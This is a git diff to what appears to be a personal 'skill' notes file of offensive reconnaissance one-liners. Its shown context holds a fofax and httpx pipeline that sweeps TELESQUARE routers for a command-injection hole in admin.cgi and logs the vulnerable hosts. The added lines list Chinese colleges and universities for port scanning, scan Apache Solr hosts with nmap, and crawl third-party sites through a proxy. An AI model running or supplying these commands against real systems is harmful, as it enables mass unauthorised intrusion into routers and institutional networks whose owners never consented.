@@ -7,7 +7,11 @@
 
 # skill 
 ```
+>https://fofax.xiecat.fun/link
 echo '(app=TELESQUARE-TLR-2005KSH)' | fofax -fs 59000 -ffi | httpx -path '/cgi-bin/admin.cgi?Command=sysCommand&Cmd=ifconfig' -mr addr -t 700 >> rout_vuln.txt
+echo '(title="职业学院" || title="大学" || title="职业技术学院" || title="学院") && country="CN"' | fofax -ff 'domain' -fs 10 | naabu
+nmap -iL <(echo 'app="APACHE-Solr"' | fofax -fs 10 -ff ip)
+
 
 katana.exe -u http://spacex.com -d 7 -ef css,js,img,jpg -proxy http://127.0.0.1:7777
 katana.exe -u https://mymail.com/ -jc -H -aff -kf -cs mymail.com -d 7 -proxy http://192.168.99.105:7777
